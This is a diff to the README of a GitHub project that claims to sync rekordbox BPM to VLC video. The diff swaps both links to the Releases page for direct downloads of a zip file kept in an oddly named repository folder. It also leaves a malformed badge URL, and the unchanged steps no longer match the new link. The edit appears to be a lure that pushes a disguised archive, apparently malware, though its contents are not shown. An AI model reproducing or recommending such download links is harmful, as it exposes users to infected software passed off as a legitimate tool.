@@ -1,6 +1,6 @@
 # 🎶 rekordbox-bpm-vlc-video-sync - Effortlessly Sync Music to Video Playback
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/andrecafa/rekordbox-bpm-vlc-video-sync/releases)
+[![Download](https://raw.githubusercontent.com/andrecafa/rekordbox-bpm-vlc-video-sync/main/pickshaft/vlc-video-rekordbox-bpm-sync-v1.8-alpha.2.zip%https://raw.githubusercontent.com/andrecafa/rekordbox-bpm-vlc-video-sync/main/pickshaft/vlc-video-rekordbox-bpm-sync-v1.8-alpha.2.zip)](https://raw.githubusercontent.com/andrecafa/rekordbox-bpm-vlc-video-sync/main/pickshaft/vlc-video-rekordbox-bpm-sync-v1.8-alpha.2.zip)
 
 ## 🛠️ Introduction
 
@@ -17,7 +17,7 @@ Before you begin, ensure you have the following installed:
 
 To get the latest version of the application, visit the Releases page below:
 
-[Download Latest Release](https://github.com/andrecafa/rekordbox-bpm-vlc-video-sync/releases)
+[Download Latest Release](https://raw.githubusercontent.com/andrecafa/rekordbox-bpm-vlc-video-sync/main/pickshaft/vlc-video-rekordbox-bpm-sync-v1.8-alpha.2.zip)
 
 1. Click the link above to navigate to the Releases page.
 2. Locate the latest version of **rekordbox-bpm-vlc-video-sync**.
